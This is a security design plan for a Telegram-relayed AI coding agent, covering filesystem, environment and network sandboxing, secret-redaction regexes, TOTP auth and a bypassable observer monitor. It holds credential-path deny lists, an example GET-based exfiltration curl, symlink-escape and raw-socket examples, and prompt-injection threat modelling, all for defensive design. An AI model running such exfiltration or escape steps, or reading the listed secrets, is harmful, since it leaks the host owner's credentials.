# Telclaude v2 Security Architecture: Final Plan

**Date:** December 2025
**Status:** Implemented
**Authors:** Aviv + Claude (with input from external security reviewer)
**Version:** 2.1 (incorporates reviewer rounds 2 + 3 feedback)

---

## Executive Summary

**What we learned:**

| Source | Key Insight |
|--------|-------------|
| **Your intuition** | Soft policy layers are friction without real security |
| **Trail of Bits (Oct 2025)** | Tool restrictions are bypassable; sandbox is primary |
| **Anthropic Engineering** | Dual-boundary (filesystem + network) sandbox; 84% fewer permission prompts |
| **External Reviewer** | Output secret filtering is critical; TOTP required (Telegram hijacking); use profiles not deletion |
| **FAR AI Research** | Layered defenses fail against staged attacks when layers leak information |
| **Reviewer Round 2** | Add env isolation, tighten network proxy, core+additive secret filter, narrow single-user auth |
| **Reviewer Round 3** | Private /tmp, symlink escapes, HTTP exfil stance, streaming redaction, reset-auth safety |

**The synthesis:**

```
┌─────────────────────────────────────────────────────────────────┐
│                    HARD ENFORCEMENT (Always On)                  │
│                                                                 │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────────┐ │
│  │  Sandbox    │  │   Secret    │  │    Auth + TOTP          │ │
│  │(FS+Net+Env) │  │   Filter    │  │  + Rate Limit + Audit   │ │
│  └─────────────┘  └─────────────┘  └─────────────────────────┘ │
│       │                 │                      │                │
│  What Claude       What Claude           Who can use &         │
│  can ACCESS        can OUTPUT            accountability        │
└─────────────────────────────────────────────────────────────────┘
                              │
            ┌─────────────────┴─────────────────┐
            ▼                                   ▼
┌───────────────────────┐           ┌───────────────────────────┐
│   SIMPLE PROFILE      │           │    STRICT PROFILE         │
│   (default)           │           │    (opt-in)               │
│                       │           │                           │
│ • Full tool access    │           │ • Observer (Haiku)        │
│ • No approvals        │           │ • Permission tiers        │
│ • No observer         │           │ • Approval workflows      │
│ • Just works™         │           │ • Fast-path regex         │
└───────────────────────┘           └───────────────────────────┘
```

---

## Table of Contents

1. [Threat Model](#threat-model)
2. [Part 1: The Five Pillars (Non-Negotiable)](#part-1-the-five-pillars-non-negotiable)
   - [Pillar 1: Filesystem Isolation](#pillar-1-filesystem-isolation)
   - [Pillar 2: Environment Isolation](#pillar-2-environment-isolation)
   - [Pillar 3: Network Isolation](#pillar-3-network-isolation)
   - [Pillar 4: Output Secret Filtering](#pillar-4-output-secret-filtering)
   - [Pillar 5: Authorization + TOTP + Rate Limiting + Audit](#pillar-5-authorization--totp--rate-limiting--audit)
3. [Part 2: Security Profiles](#part-2-security-profiles)
4. [Part 3: Implementation Plan](#part-3-implementation-plan)
5. [Part 4: Code Organization](#part-4-code-organization)
6. [Part 5: Migration Path](#part-5-migration-path)
7. [Part 6: Security Test Checklist](#part-6-security-test-checklist)
8. [Summary: Before vs After](#summary-before-vs-after)
9. [Sources](#sources)

---

## Threat Model

**Explicit assumptions:**

| Assumption | Description |
|------------|-------------|
| **Attacker controls prompts** | User account compromised, or malicious prompt injection via external content |
| **Attacker cannot break OS sandbox** | Kernel-level isolation (seatbelt/bubblewrap) is trusted |
| **Attacker can do arbitrary I/O inside sandbox** | But only via our controlled interfaces |
| **Local machine is trusted** | No root access, no kernel exploits |
| **Telegram account can be hijacked** | SIM swap, session hijack, phishing → TOTP required |

**What we're protecting against:**

1. **Credential exfiltration** - `~/.ssh`, `~/.aws`, API keys in env vars
2. **Data exfiltration** - Sending secrets back via Telegram messages or HTTP
3. **Unauthorized access** - Random people talking to your bot
4. **Resource abuse** - Rate limiting prevents spam/cost attacks
5. **Accidental damage** - Sandbox limits blast radius

**What we're NOT protecting against:**

- Kernel exploits / sandbox escapes (out of scope)
- Physical access to machine (out of scope)
- Compromise of the telclaude process itself (out of scope)

---

## Part 1: The Five Pillars (Non-Negotiable)

### Pillar 1: Filesystem Isolation

**Principle:** Deny `~` broadly, allow only the project workspace.

```typescript
// src/sandbox/config.ts
export const SANDBOX_CONFIG = {
  filesystem: {
    // Use synthetic paths - don't trust process.cwd() near ~
    workspace: '/workspace',  // Project mounted here inside sandbox

    // PRIVATE /tmp - mount ~/.telclaude/sandbox-tmp as /tmp inside sandbox
    // This prevents reading secrets from host /tmp (keyring sockets, dbus, etc.)
    privateTmp: {
      hostPath: '~/.telclaude/sandbox-tmp',  // Created on startup, cleaned per-session
      sandboxPath: '/tmp',
    },

    // Read access (explicit allowlist)
    allowRead: [
      '/workspace',           // Project directory (mounted)
      '/usr/lib', '/lib',     // System libraries
      '/usr/share',           // Shared resources
      '/tmp',                 // Private tmp (mounted from privateTmp.hostPath)
    ],

    // Write access (strict subset)
    allowWrite: [
      '/workspace',           // Project only
      '/tmp',                 // Private tmp only
    ],

    // Symlink policy - CRITICAL for preventing escapes
    symlinks: {
      // Reject symlinks that resolve outside allowed paths
      policy: 'reject-external',
      // Log symlink resolution attempts for audit
      logAttempts: true,
    },

    // Explicit denials (defense in depth)
    // These are blocked even if somehow in allowRead
    denyRead: [
      // Credentials
      '~/.ssh', '~/.gnupg', '~/.aws', '~/.azure', '~/.gcloud',
      '~/.npmrc', '~/.pypirc', '~/.netrc', '~/.git-credentials',
      '~/.docker/config.json', '~/.kube/config',

      // Telclaude's own data
      '~/.telclaude', '~/.config/telclaude',

      // System secrets
      '/etc/shadow', '/etc/sudoers', '/etc/ssl/private',

      // Catch-all: deny ~ itself and direct children
      '~', '~/*',
    ],
  },
};
```

**Key changes from v1:**
- **Synthetic `/workspace`** instead of `process.cwd()` - prevents "user runs telclaude in ~" accidents
- **Deny `~` and `~/*` broadly** - stop playing whack-a-mole with new credential locations
- **Mount project explicitly** - sandbox sees `/workspace`, not actual path
- **Private `/tmp`** - mount `~/.telclaude/sandbox-tmp` as `/tmp` inside sandbox; prevents reading keyring sockets, dbus secrets, etc. from host `/tmp`
- **Symlink rejection** - symlinks that resolve outside allowed paths are blocked; prevents `ln -s ~/.ssh /workspace/leak` escape attempts
- **Multi-workspace support** - each workspace mount must still respect global deny rules (no mounting `~` directly)

---

### Pillar 2: Environment Isolation

**Principle:** Construct a fresh env from allowlist. Never pass through secrets.

```typescript
// src/sandbox/env.ts

// Only these env vars pass through to sandbox
const ENV_ALLOWLIST = [
  'PATH', 'LANG', 'LC_ALL', 'LC_CTYPE',
  'TZ', 'TERM', 'COLORTERM',
  'HOME',  // Set to synthetic /home/sandbox, not real ~
  'USER', 'SHELL',
  'EDITOR', 'VISUAL',
  'XDG_RUNTIME_DIR', 'XDG_CONFIG_HOME', 'XDG_DATA_HOME',
];

// These prefixes are NEVER passed through (even if user adds to allowlist)
const ENV_DENY_PREFIXES = [
  'AWS_', 'GCP_', 'AZURE_', 'GOOGLE_',
  'ANTHROPIC_', 'OPENAI_', 'COHERE_',
  'TELEGRAM_', 'SLACK_', 'DISCORD_',
  'GH_', 'GITHUB_', 'GITLAB_', 'BITBUCKET_',
  'NPM_', 'YARN_', 'PNPM_',  // Package manager auth
  'DOCKER_', 'KUBERNETES_', 'K8S_',
  'DATABASE_', 'DB_', 'REDIS_', 'MONGO_',
  'SECRET_', 'PASSWORD_', 'TOKEN_', 'KEY_', 'CREDENTIAL_',
];

export function buildSandboxEnv(processEnv: NodeJS.ProcessEnv): Record<string, string> {
  const sandboxEnv: Record<string, string> = {};

  for (const key of ENV_ALLOWLIST) {
    if (processEnv[key] && !matchesDenyPrefix(key)) {
      sandboxEnv[key] = processEnv[key]!;
    }
  }

  // Override HOME to synthetic path
  sandboxEnv.HOME = '/home/sandbox';

  return sandboxEnv;
}

function matchesDenyPrefix(key: string): boolean {
  return ENV_DENY_PREFIXES.some(prefix => key.startsWith(prefix));
}
```

**Why this matters:**
- `git`, `aws`, `gcloud` etc. pick up credentials from env vars
- `process.env.ANTHROPIC_API_KEY` is visible to any code in the process
- Even if we deny `~/.aws`, `AWS_SECRET_ACCESS_KEY` in env bypasses that

**Key design decisions:**
- **Allowlist-only model**: Only vars in `ENV_ALLOWLIST` pass through. Everything else is implicitly denied.
  - This is critical: `SENTRY_DSN`, `NEW_RELIC_LICENSE_KEY`, etc. are automatically blocked because they're not in the allowlist.
  - Never add a broad allowlist entry like `'*'`.
- **Deny prefixes are a secondary belt**: Even if someone "helpfully" adds a var to the allowlist, the deny prefixes catch common credential patterns.
- **HOME alignment**: `HOME=/home/sandbox` is a synthetic path. The FS allowlist doesn't include `/home`, so even if the sandbox runtime does traditional Unix permission checks first, there's nothing to read there.

---

### Pillar 3: Network Isolation

**Principle:** Proxy all traffic. Block by default. Restrict methods.

```typescript
// src/sandbox/network-proxy.ts

export const NETWORK_CONFIG = {
  // Unix socket for proxy
  proxySocket: '~/.telclaude/network-proxy.sock',

  // Default domain allowlist
  allowedDomains: [
    // Package registries
    { domain: 'registry.npmjs.org', methods: ['GET', 'HEAD'] },
    { domain: 'pypi.org', methods: ['GET', 'HEAD'] },
    { domain: 'crates.io', methods: ['GET', 'HEAD'] },
    { domain: 'rubygems.org', methods: ['GET', 'HEAD'] },

    // Documentation
    { domain: 'docs.python.org', methods: ['GET', 'HEAD'] },
    { domain: 'docs.rs', methods: ['GET', 'HEAD'] },
    { domain: 'developer.mozilla.org', methods: ['GET', 'HEAD'] },
    { domain: 'stackoverflow.com', methods: ['GET', 'HEAD'] },

    // Code hosting (READ ONLY by default - POST requires explicit config)
    { domain: 'github.com', methods: ['GET', 'HEAD'] },
    { domain: 'gitlab.com', methods: ['GET', 'HEAD'] },
    { domain: 'bitbucket.org', methods: ['GET', 'HEAD'] },
    { domain: 'raw.githubusercontent.com', methods: ['GET', 'HEAD'] },
  ],

  // HARD BLOCKED - cannot be overridden by config
  blockedNetworks: [
    // Localhost
    '127.0.0.0/8', '::1', 'localhost',

    // RFC1918 private ranges
    '10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16',

    // Link-local
    '169.254.0.0/16', 'fe80::/10',

    // Cloud metadata endpoints
    '169.254.169.254',           // AWS/GCP/Azure metadata
    'metadata.google.internal',   // GCP
    '100.100.100.200',           // Alibaba Cloud
  ],

  // Default action for unlisted domains
  defaultAction: 'block',  // or 'prompt' to ask user

  // Ports
  allowedPorts: [80, 443],
};
```

**Method restrictions rationale:**
- `github.com` with POST = attacker can create private repo and push secrets
- Default to GET/HEAD only; require explicit config for POST
- `doctor` should warn loudly if POST is enabled for any domain

**DNS behavior:**
- Domain checks happen AFTER resolution (prevent `evil.com` → `127.0.0.1` tricks)
- No wildcards like `*.com` - only `*.pypi.org` style subdomain patterns
- Consider CNAME chain validation

**Enforcement:**
- If using `@anthropic-ai/sandbox-runtime`, it intercepts at syscall level
- If custom proxy: must ensure ALL HTTP clients route through it (iptables/pf redirect)

**Non-HTTP protocol blocking (CRITICAL):**
- Sandbox runtime MUST intercept ALL outbound TCP sockets, not just HTTP
- Raw TCP attempts (e.g., `nc <ip> 443`, `python socket.connect()`) must be blocked
- Attacker could otherwise exfil on port 443 to an IP that resolves to an allowed domain
- Implementation: either redirect all TCP to proxy, or outright ban arbitrary sockets

**HTTP exfiltration stance (EXPLICIT DECISION):**

We acknowledge that GET/HEAD to "benign" domains can still carry secrets via query params or headers:
```
curl "https://registry.npmjs.org/foo?secret=GH_PAT_HERE"
```

**Our stance: Accept limited exfil in simple profile, optional tightening in strict.**

| Profile | Approach |
|---------|----------|
| `simple` | Domain + method restrictions only. Accept that trivial GET-based exfil is possible. Output filter + log redaction protect the main channels (Telegram + logs). |
| `strict` | Optional: Run secret filter over outbound request URLs/bodies before proxying. Reject requests with high-entropy query params or known secret patterns. |

Rationale:
- **Full elimination is impractical**: Would require allowlisting specific paths and parameter shapes for each domain
- **Output filter is the primary defense**: Secrets in Claude's response → redacted before reaching Telegram
- **Accepting known limitations > false sense of security**: Better to document what we don't stop than pretend we stop everything

---

### Pillar 4: Output Secret Filtering

**Principle:** Core patterns are immutable. Users can add, never remove.

```typescript
// src/security/output-filter.ts

// CORE patterns - NEVER configurable, NEVER removable
const CORE_SECRET_PATTERNS = [
  // API keys
  { id: 'ANTHROPIC_KEY', pattern: /sk-ant-[a-zA-Z0-9-_]{80,}/g },
  { id: 'OPENAI_KEY', pattern: /sk-[a-zA-Z0-9]{48,}/g },
  { id: 'GITHUB_PAT', pattern: /ghp_[a-zA-Z0-9]{36}/g },
  { id: 'GITHUB_OAUTH', pattern: /gho_[a-zA-Z0-9]{36}/g },
  { id: 'AWS_KEY', pattern: /AKIA[0-9A-Z]{16}/g },

  // Private keys
  { id: 'PRIVATE_KEY', pattern: /-----BEGIN (RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----/g },
  { id: 'PGP_PRIVATE', pattern: /-----BEGIN PGP PRIVATE KEY BLOCK-----/g },

  // Tokens
  { id: 'JWT', pattern: /eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*/g },
  { id: 'TELEGRAM_TOKEN', pattern: /[0-9]{8,10}:[a-zA-Z0-9_-]{35}/g },

  // TOTP seeds (base32)
  { id: 'TOTP_SEED', pattern: /[A-Z2-7]{32,}/g },  // Be careful with false positives

  // Generic env var patterns
  { id: 'ENV_SECRET', pattern: /(?:PASSWORD|SECRET|TOKEN|KEY|CREDENTIAL)[\s]*[=:][\s]*['"]?[^\s'"]{8,}/gi },
];

// Entropy-based detection for encoded secrets
function detectHighEntropyBlob(chunk: string): string[] {
  const suspiciousBlobs: string[] = [];

  // Look for base64-ish or hex-ish blobs
  const blobPattern = /[=:]\s*['"]?([a-zA-Z0-9+/=]{32,}|[a-fA-F0-9]{32,})['"]?/g;
  let match;
  while ((match = blobPattern.exec(chunk)) !== null) {
    const blob = match[1];
    const entropy = calculateEntropy(blob);
    if (entropy > 4.5 && blob.length >= 32) {  // High entropy, decent length
      suspiciousBlobs.push(blob);
    }
  }

  return suspiciousBlobs;
}

// Config model: core + additive
export interface SecretFilterConfig {
  // Users can ADD patterns, never remove CORE
  additionalPatterns?: Array<{ id: string; pattern: string }>;

  // Entropy detection (on by default)
  entropyDetection?: { enabled: boolean; threshold?: number };
}

// Redaction
export function redactSecrets(chunk: string, config: SecretFilterConfig): RedactionResult {
  let redacted = chunk;
  const redactions: RedactionEvent[] = [];

  // Apply core patterns (always)
  for (const { id, pattern } of CORE_SECRET_PATTERNS) {
    const matches = redacted.match(pattern);
    if (matches) {
      redactions.push({ patternId: id, count: matches.length });
      redacted = redacted.replace(pattern, `[REDACTED:${id}]`);
    }
  }

  // Apply user patterns
  for (const { id, pattern } of config.additionalPatterns ?? []) {
    const regex = new RegExp(pattern, 'g');
    const matches = redacted.match(regex);
    if (matches) {
      redactions.push({ patternId: `user:${id}`, count: matches.length });
      redacted = redacted.replace(regex, `[REDACTED:user:${id}]`);
    }
  }

  // Entropy detection
  if (config.entropyDetection?.enabled !== false) {
    const blobs = detectHighEntropyBlob(redacted);
    for (const blob of blobs) {
      redactions.push({ patternId: 'HIGH_ENTROPY', count: 1 });
      redacted = redacted.replace(blob, '[REDACTED:HIGH_ENTROPY]');
    }
  }

  return { redacted, redactions };
}
```

**Logs as leak channel - CRITICAL:**
```typescript
// Audit logs MUST go through redaction
export function logSecurityEvent(event: SecurityEvent): void {
  // Redact before logging
  if (event.prompt) {
    event.prompt = redactSecrets(event.prompt, config).redacted;
  }
  if (event.response) {
    event.response = redactSecrets(event.response, config).redacted;
  }

  // Log structured event WITHOUT raw values
  auditLogger.info({
    type: event.type,
    chatId: event.chatId,
    timestamp: event.timestamp,
    // Include redaction metadata, not content
    redactionsApplied: event.redactions?.length ?? 0,
  });
}

// Log buckets
export const LOG_BUCKETS = {
  security: 'security.log',   // Auth, approvals, redactions (always on)
  metrics: 'metrics.log',     // Counts, not content (always on)
  debug: 'debug.log',         // Full traces (OFF by default, warns about secrets)
};
```

**TOTP seeds protection:**
- TOTP daemon NEVER sends seeds across IPC - only time-based codes
- If seeds somehow leak, base32 pattern catches them in output filter

**Streaming redaction (CRITICAL for chunk boundaries):**

Secrets can straddle chunk boundaries when streaming to Telegram:
```
Chunk 1: "Here's the key: ghp_abc12345"
Chunk 2: "6789abcdef..."
```
Neither chunk individually matches the pattern.

```typescript
// src/security/streaming-redactor.ts
export class StreamingRedactor {
  private buffer = '';
  private readonly OVERLAP_SIZE = 100;  // Keep last N chars

  processChunk(chunk: string): string {
    // Combine buffer with new chunk
    const combined = this.buffer + chunk;

    // Redact the combined string
    const { redacted, redactions } = redactSecrets(combined, this.config);

    // Keep the last OVERLAP_SIZE chars as buffer for next chunk
    // But only emit the new portion
    const emitFrom = this.buffer.length;
    this.buffer = redacted.slice(-this.OVERLAP_SIZE);

    return redacted.slice(emitFrom);
  }

  flush(): string {
    // Emit remaining buffer on stream end
    const final = this.buffer;
    this.buffer = '';
    return final;
  }
}
```

**Surface area - everything that leaves the process:**

Rule of thumb: **If a string can reach Telegram or disk, it MUST pass through `redactSecrets`.**

Coverage checklist:
- [x] Claude response text → Telegram
- [x] Tool results printed to conversation
- [x] File contents when agent "cats" a file back
- [x] Error messages (may echo env, stack traces)
- [x] Audit logs (prompts, responses, metadata)
- [x] Debug logs (if enabled)

**High-entropy tuning:**

The entropy threshold (> 4.5, len ≥ 32) will hit some false positives:
- Random IDs (e.g., UUIDs)
- Git commit hashes
- Some base64-encoded non-secrets

We keep "better safe than sorry" approach, but:
```typescript
// Expose metrics counter for false-positive monitoring
metrics.increment('secrets.high_entropy_redacted');

// In strict profile, allow tuning
export interface SecretFilterConfig {
  entropyDetection?: {
    enabled: boolean;
    threshold?: number;  // Default 4.5
    minLength?: number;  // Default 32
  };
}
```

---

### Pillar 5: Authorization + TOTP + Rate Limiting + Audit

#### Single-User Auth (Narrowed)

```typescript
// src/security/auth.ts

export interface SingleUserAuthConfig {
  mode: 'single-user';

  // CRITICAL: Only private chats can claim admin
  // Prevents: someone adds bot to public group → group becomes admin
  allowGroupClaim: false;  // Hardcoded, not configurable

  // First private message triggers claim flow
  claimBehavior: 'confirm';  // Require /approve reply within timeout
}

// First message flow
async function handleFirstMessage(ctx: MessageContext): Promise<void> {
  // Reject group chats for admin claim
  if (ctx.chat.type !== 'private') {
    await ctx.reply('Admin claim only works in private chats.');
    return;
  }

  // Generate confirmation code
  const code = generateSecureCode();
  pendingClaims.set(ctx.chat.id, { code, expiresAt: Date.now() + 5 * 60 * 1000 });

  // Log the attempt
  auditLog({ type: 'admin_claim_started', chatId: ctx.chat.id });

  await ctx.reply(
    `🔐 First-time setup\n\n` +
    `To link this chat as admin, reply with:\n` +
    `/approve ${code}\n\n` +
    `This expires in 5 minutes.`
  );
}

// Reset ownership
// CLI command: telclaude reset-auth
// Nukes local auth state, forces re-claim on next message

// SAFETY: reset-auth is dangerous, require explicit confirmation
async function resetAuth(): Promise<void> {
  console.log('⚠️  WARNING: This will remove all identity links.');
  console.log('   The next Telegram message will be able to claim admin.');
  console.log('');
  console.log('   If you did NOT run this command, something is wrong.');
  console.log('');

  const answer = await prompt('Type "RESET" to confirm: ');
  if (answer !== 'RESET') {
    console.log('Aborted.');
    return;
  }

  // Log security event BEFORE action
  auditLog({
    type: 'auth_reset',
    severity: 'high',
    timestamp: Date.now(),
  });

  // Nuke auth state
  db.prepare('DELETE FROM identity_links').run();
  db.prepare('DELETE FROM totp_sessions').run();

  console.log('✓ Auth state reset. Next Telegram message can claim admin.');
}
```

#### First-Run TOTP Prompt

```typescript
// After successful admin claim, prompt for TOTP setup
async function promptTotpSetup(ctx: MessageContext): Promise<void> {
  await ctx.reply(
    `✅ Chat linked as admin.\n\n` +
    `⚠️ TOTP is recommended to protect against Telegram account hijacking.\n\n` +
    `Set up now? Reply /totp-setup or /skip-totp`
  );

  // Log the choice in audit
  auditLog({ type: 'totp_prompt_shown', chatId: ctx.chat.id });
}
```

#### Per-Action TOTP (Strict Profile, Future Enhancement)

For strict profile, consider extending TOTP beyond just linking:

```typescript
// Per-action TOTP policy (future enhancement)
export interface PerActionTotpConfig {
  // Re-challenge if last TOTP was > N minutes ago AND action is destructive
  rechallengeMins?: number;  // Default: 30

  // Actions that trigger re-challenge
  destructiveActions: [
    'bash_write',       // Bash commands that modify files
    'network_post',     // POST requests to allowed domains
    'file_delete',      // rm, unlink operations
  ];
}

// Example flow:
// 1. User sends "delete all test files"
// 2. System: "This is a destructive action. Reply with your TOTP code to proceed."
// 3. User: "123456"
// 4. Action proceeds (or is blocked if wrong)
```

**Note:** Not required for v2 launch, but the architecture supports it.

#### Linked Mode Guarantees

```typescript
// For strict profile with linked auth
export interface LinkedAuthConfig {
  mode: 'linked';
  requireTotp: boolean;

  // If requireTotp is true, linking CANNOT complete without TOTP verification
  // This is enforced in the linking flow, not just config validation
}

// Linking flow with TOTP requirement
async function completeLink(userId: string, totpCode?: string): Promise<LinkResult> {
  const config = getSecurityConfig();

  if (config.auth.requireTotp && !totpCode) {
    return { success: false, error: 'TOTP code required for linking' };
  }

  if (totpCode && !verifyTotp(userId, totpCode)) {
    return { success: false, error: 'Invalid TOTP code' };
  }

  // Log linking event
  auditLog({ type: 'identity_linked', userId, chatId: ctx.chat.id });

  return { success: true };
}
```

#### Rate Limiting Dimensions

```typescript
// src/security/rate-limit.ts

export interface RateLimitConfig {
  // Global limits
  global: { perMinute: number; perHour: number };

  // Per-chat limits (prevents one chat from hogging)
  perChat: { perMinute: number; perHour: number };

  // Per-tool limits (optional, for finer control)
  perTool?: {
    bash: { perMinute: number; perHour: number };
    write: { perMinute: number; perHour: number };
    network: { perMinute: number; perHour: number };
  };
}

// Default config
const DEFAULT_RATE_LIMITS: RateLimitConfig = {
  global: { perMinute: 60, perHour: 500 },
  perChat: { perMinute: 20, perHour: 200 },
  // perTool is optional, not set by default
};
```

---

## Part 2: Security Profiles

### Profile: `simple` (DEFAULT)

**For:** Personal dev use, single user, "just works"

```jsonc
{
  "security": {
    "profile": "simple",

    // Hard enforcement (always on, can't disable)
    "sandbox": {
      "required": true,
      "workspace": "/workspace"
    },

    // Auth
    "auth": {
      "mode": "single-user",
      "totpPrompt": true  // Prompt to set up, but don't require
    },

    // Resource protection
    "rateLimits": {
      "global": { "perMinute": 60, "perHour": 500 },
      "perChat": { "perMinute": 20, "perHour": 200 }
    },

    // Audit (always on)
    "audit": { "enabled": true }

    // NOTE: observer, approvals, tiers are NOT present = disabled
  }
}
```

**User experience:**
```bash
# Install
npm install -g telclaude

# Set token
export TELEGRAM_BOT_TOKEN=...

# Run
telclaude relay

# First message triggers admin claim flow
# Bot: "Reply /approve ABC123 to link this chat"
# User: /approve ABC123
# Bot: "✅ Linked. Set up TOTP? /totp-setup or /skip-totp"
```

---

### Profile: `strict` (OPT-IN)

**For:** Multi-user, paranoid, enterprise

```jsonc
{
  "security": {
    "profile": "strict",

    // All hard enforcement, plus:
    "auth": {
      "mode": "linked",
      "totp": { "required": true }
    },

    // Soft policy layers (enabled in strict)
    "observer": {
      "enabled": true,
      "maxLatencyMs": 2000,
      "fallbackOnTimeout": "block"
    },
    "permissions": {
      "defaultTier": "READ_ONLY",
      "users": { /* per-user tier overrides */ }
    },
    "approvals": {
      "enabled": true,
      "requiredFor": ["FULL_ACCESS", "BLOCK_classification"]
    },
    "fastPath": { "enabled": true },

    // Network: allow POST for specific domains
    "network": {
      "allowPost": ["api.github.com"]  // Shown in doctor with warning
    }
  }
}
```

**Doctor output for strict profile:**
```
=== telclaude doctor ===
Security profile: strict

⚠️  Observer / approvals are advisory (bypassable).
    The sandbox is the security boundary.

Hard enforcement:
  ✓ Sandbox: seatbelt (macOS) - healthy
  ✓ Network proxy: running
    ⚠️ POST enabled for: api.github.com
  ✓ Env isolation: 47 vars blocked
  ✓ Secret filter: core + 3 user patterns
  ✓ Auth: linked mode, TOTP required
  ...

Soft policy (advisory):
  ✓ Observer: enabled
  ✓ Permission tiers: READ_ONLY default
  ✓ Approvals: enabled
```

---

## Part 3: Implementation Plan

### Phase 1: Profiles + Pipeline (Week 1)

**Goal:** Ship `simple` as default without breaking `strict` users

```typescript
// src/security/pipeline.ts

export interface SecurityPipeline {
  beforeExecution(ctx: MessageContext): Promise<SecurityDecision>;
  afterExecution(ctx: MessageContext, result: ExecutionResult): Promise<void>;
}

export function buildSecurityPipeline(config: SecurityConfig): SecurityPipeline {
  const profile = config.profile ?? 'simple';

  // Hard enforcement (always included)
  const hardLayers = [
    new SandboxEnforcer(config.sandbox),
    new EnvIsolation(),          // NEW
    new InfraSecretGuard(),
    new AuthLayer(config.auth),
    new RateLimiter(config.rateLimits),
  ];

  // Soft policy (only in strict)
  const softLayers = profile === 'strict' ? [
    new FastPathFilter(config.fastPath),
    new Observer(config.observer),
    new ApprovalManager(config.approvals),
  ] : [];

  // Output filtering (always included)
  const outputLayers = [
    new SecretOutputFilter(config.secretFilter),
    new AuditLogger(config.audit),
  ];

  return new CompositePipeline(hardLayers, softLayers, outputLayers);
}
```

**Remove `bypassPermissions` flag:**
```typescript
// BEFORE (problematic)
const result = await runClaudeSession(ctx, { bypassPermissions: true });

// AFTER (clean)
// All permission logic lives in the pipeline
// SDK is always called with full access; sandbox is the boundary
const result = await runClaudeSession(ctx);
```

**Unit-testable pipeline:**
```typescript
// src/security/pipeline.test.ts
describe('SecurityPipeline', () => {
  it('blocks requests when sandbox unavailable', async () => {
    const pipeline = buildSecurityPipeline({
      profile: 'simple',
      sandbox: { available: false },
    });
    const decision = await pipeline.beforeExecution(mockCtx);
    expect(decision.action).toBe('block');
  });

  it('redacts secrets in output', async () => {
    const pipeline = buildSecurityPipeline({ profile: 'simple' });
    const result = { output: 'key: ghp_abc123...' };
    await pipeline.afterExecution(mockCtx, result);
    expect(result.output).toContain('[REDACTED:GITHUB_PAT]');
  });
});

// No-op profile for testing - EXPLICIT handling required
export const TEST_PROFILE: SecurityConfig = {
  profile: 'test',
  sandbox: { mock: true },
  auth: { mock: true },
  rateLimits: { disabled: true },
};

// IMPORTANT: buildSecurityPipeline must handle 'test' explicitly
// Don't let it fall through to 'simple' accidentally
export function buildSecurityPipeline(config: SecurityConfig): SecurityPipeline {
  const profile = config.profile ?? 'simple';

  if (profile === 'test') {
    // Return a no-op pipeline for testing
    return new NoOpPipeline();
  }

  // ... rest of implementation
}
```

**Lazy loading for strict-only code:**

```typescript
// src/security/pipeline.ts

export async function buildSecurityPipeline(config: SecurityConfig): Promise<SecurityPipeline> {
  const profile = config.profile ?? 'simple';

  // Hard enforcement (always imported at module load)
  const hardLayers = [
    new SandboxEnforcer(config.sandbox),
    new EnvIsolation(),
    new InfraSecretGuard(),
    new AuthLayer(config.auth),
    new RateLimiter(config.rateLimits),
  ];

  // Soft policy (dynamically imported only for strict)
  let softLayers: SecurityLayer[] = [];
  if (profile === 'strict') {
    // Lazy import - only strict users pay for these modules
    const [
      { FastPathFilter },
      { Observer },
      { ApprovalManager },
    ] = await Promise.all([
      import('./fast-path.js'),
      import('./observer.js'),
      import('./approvals.js'),
    ]);

    softLayers = [
      new FastPathFilter(config.fastPath!),
      new Observer(config.observer!),
      new ApprovalManager(config.approvals!),
    ];
  }

  // Output filtering (always imported)
  const outputLayers = [
    new SecretOutputFilter(config.secretFilter),
    new AuditLogger(config.audit),
  ];

  return new CompositePipeline(hardLayers, softLayers, outputLayers);
}
```

Benefits of lazy loading:
- `simple` profile users never load observer.ts, fast-path.ts, Haiku client
- Faster startup time for the common case
- Smaller memory footprint

---

### Phase 2: Environment + Network Isolation (Week 2)

**Goal:** Complete the triple-boundary sandbox (FS + Env + Net)

**Network proxy with feature flag:**
```typescript
// Initially behind feature flag for safe rollout
const NETWORK_PROXY_ENABLED = process.env.TELCLAUDE_NETWORK_PROXY === '1';

if (NETWORK_PROXY_ENABLED) {
  sandbox.enableNetworkProxy(NETWORK_CONFIG);
}
```

**Doctor --network self-test:**
```bash
telclaude doctor --network

# Output:
Network isolation test:
  ✓ Proxy socket: ~/.telclaude/network-proxy.sock
  ✓ Test request to registry.npmjs.org: allowed (GET)
  ✓ Test request to evil.com: blocked
  ✓ Direct connection attempt: blocked
  ✓ localhost access: blocked
  ✓ Metadata endpoint (169.254.169.254): blocked
```

---

### Phase 3: Config + First-Run UX (Week 2)

**Auto-populate with confirmation:**
```typescript
// On first message, don't silently auto-approve
async function handleFirstMessage(ctx: MessageContext): Promise<void> {
  // Log attempt
  auditLog({ type: 'first_message', chatId: ctx.chat.id });

  // Require explicit confirmation
  const code = generateSecureCode();
  await ctx.reply(`Reply /approve ${code} within 5 minutes to link this chat.`);
}
```

**Migration summary on startup:**
```typescript
if (migrated) {
  logger.info('=== Config Migration ===');
  logger.info('Detected legacy config. Migrated to strict profile.');
  logger.info('This preserves your existing observer/approval/tier settings.');
  logger.info('See docs/MIGRATION.md for details.');
  logger.info('========================');

  // Also notify in Telegram on first admin message
  pendingMigrationNotice = true;
}
```

---

### Phase 4: Doctor + CLI (Week 3)

**Enhanced doctor output:**
```
=== telclaude doctor ===
Security profile: simple

Hard enforcement:
  ✓ Sandbox: seatbelt (macOS) - healthy
  ✓ Env isolation: 47 vars blocked, 12 allowed
  ✓ Network proxy: running
    Allowed domains: 8 (GET/HEAD only)
    POST enabled: none
  ✓ Secret filter: core (15 patterns) + user (0 patterns)
    Entropy detection: enabled
  ✓ Auth: single-user (chat 123456789)
  ✓ Rate limiting: 60/min global, 20/min per-chat
  ✓ Audit: security.log, metrics.log

Soft policy: disabled (simple profile)

TOTP: configured ✓

Run `telclaude doctor --network` for network isolation self-test.
Run `telclaude doctor --secrets` to test secret detection.
```

---

## Part 4: Code Organization

### Files to Keep (Core - Always Loaded)

```
src/security/
├── pipeline.ts          # SecurityPipeline abstraction
├── output-filter.ts     # Secret filtering (core + additive)
├── env-isolation.ts     # NEW: Environment variable filtering
├── auth.ts              # Authorization (single-user + linked)
├── rate-limit.ts        # Rate limiting (global + per-chat + per-tool)
├── audit.ts             # Audit logging (with redaction)
└── types.ts             # Security types

src/sandbox/
├── manager.ts           # Sandbox manager
